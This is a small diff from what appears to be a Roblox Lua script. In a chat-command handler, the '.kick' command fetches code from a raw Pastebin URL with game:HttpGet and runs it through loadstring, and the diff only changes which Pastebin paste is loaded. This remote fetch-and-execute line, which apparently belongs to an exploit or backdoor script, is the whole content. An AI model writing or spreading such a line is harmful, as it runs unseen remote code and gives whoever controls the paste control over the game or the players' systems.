@@ -346,7 +346,7 @@ end
   end
 
   if msg:lower():sub(1,5) == ".kick" then
-   loadstring(game:HttpGet("https://pastebin.com/raw/gDkKZkP3"))()
+   loadstring(game:HttpGet("https://pastebin.com/raw/521RMhkc"))()
   end
 
 end)
